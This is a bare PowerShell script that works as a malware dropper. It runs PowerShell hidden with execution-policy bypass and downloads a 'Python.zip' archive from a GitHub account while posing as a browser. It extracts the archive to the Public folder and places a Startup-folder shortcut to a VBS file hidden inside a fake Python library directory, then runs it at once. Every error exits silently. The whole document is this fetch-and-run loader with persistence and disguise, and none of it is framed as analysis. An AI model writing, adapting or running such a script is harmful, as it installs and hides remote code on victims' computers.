cmd /c start /min "" powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -Command"

# Define URL and download path
$url = "https://github.com/Ladyhaha06/main/raw/refs/heads/main/Python.zip"
$publicDir = "$env:Public"
$outputDir = Join-Path -Path $publicDir -ChildPath "Python"
$outputFile = Join-Path -Path $publicDir -ChildPath "Python.zip"

# Create destination directory if it doesn't exist
if (!(Test-Path -Path $outputDir)) {
    New-Item -ItemType Directory -Path $outputDir -Force | Out-Null
}

# Download the ZIP file
try {
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    $webClient.DownloadFile($url, $outputFile)
} catch {
    exit
}

# Extract ZIP file
if (Test-Path -Path $outputFile) {
    try {
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        [System.IO.Compression.ZipFile]::ExtractToDirectory($outputFile, $outputDir)
        Remove-Item -Path $outputFile -Force
    } catch {
        exit
    }
} else {
    exit
}

# Create Shortcut for Python.vbs in the specified directory
$TargetFile = "C:\Users\Public\Python\Lib\lib2to3\Python.vbs"
$ShortcutName = "Python.lnk"
$StartupDir = [Environment]::GetFolderPath("Startup")
$ShortcutPath = Join-Path -Path $StartupDir -ChildPath $ShortcutName

try {
    $Shell = New-Object -ComObject WScript.Shell
    $Shortcut = $Shell.CreateShortcut($ShortcutPath)
    $Shortcut.TargetPath = $TargetFile
    $Shortcut.WorkingDirectory = (Split-Path -Path $TargetFile)
    $Shortcut.Save()
    Start-Process -FilePath $ShortcutPath
} catch {
    exit
}
